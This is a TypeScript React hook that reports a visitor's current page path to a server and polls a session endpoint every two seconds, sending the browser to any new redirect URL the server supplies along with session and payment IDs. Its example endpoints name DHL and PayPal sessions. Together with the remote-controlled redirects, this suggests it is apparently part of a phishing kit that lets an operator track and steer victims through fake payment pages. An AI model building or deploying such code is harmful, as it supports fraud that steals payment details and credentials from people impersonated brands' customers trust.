import { useEffect, useRef } from "react";

interface UseRedirectPollingOptions {
  sessionId: string | null;
  currentPath: string;
  paymentId?: string;
  apiEndpoint: string; // e.g., "/api/dhl/session" or "/api/paypal/session"
  pathEndpoint: string; // e.g., "/api/dhl/session/:sessionId/path"
}

export function useRedirectPolling({
  sessionId,
  currentPath,
  paymentId,
  apiEndpoint,
  pathEndpoint,
}: UseRedirectPollingOptions) {
  const lastRedirectVersionRef = useRef<number>(0);

  useEffect(() => {
    if (!sessionId) return;

    // Report current path to server
    const reportPath = async () => {
      try {
        await fetch(pathEndpoint.replace(":sessionId", sessionId), {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentPath }),
        });
      } catch (error) {
        console.error("Failed to report path:", error);
      }
    };

    reportPath();

    // Load last seen redirect version from localStorage
    const storedVersion = localStorage.getItem(
      `redirect_version_${sessionId}`
    );
    if (storedVersion) {
      lastRedirectVersionRef.current = parseInt(storedVersion, 10);
    }

    // Poll for redirect version changes
    const pollInterval = setInterval(async () => {
      try {
        const response = await fetch(`${apiEndpoint}/${sessionId}`);
        if (response.ok) {
          const data = await response.json();

          // Check if redirectVersion has increased (new redirect)
          if (
            data.redirectUrl &&
            data.redirectVersion > lastRedirectVersionRef.current
          ) {
            // Update last seen version in localStorage and ref
            lastRedirectVersionRef.current = data.redirectVersion;
            localStorage.setItem(
              `redirect_version_${sessionId}`,
              data.redirectVersion.toString()
            );

            // Navigate to new redirect URL
            const url = data.redirectUrl.includes("?")
              ? `${data.redirectUrl}&${paymentId ? `paymentId=${paymentId}&` : ""}session=${sessionId}`
              : `${data.redirectUrl}?${paymentId ? `paymentId=${paymentId}&` : ""}session=${sessionId}`;
            window.location.href = url;
          }
        }
      } catch (error) {
        console.error("Failed to poll session:", error);
      }
    }, 2000);

    return () => clearInterval(pollInterval);
  }, [sessionId, currentPath, paymentId, apiEndpoint, pathEndpoint]);
}
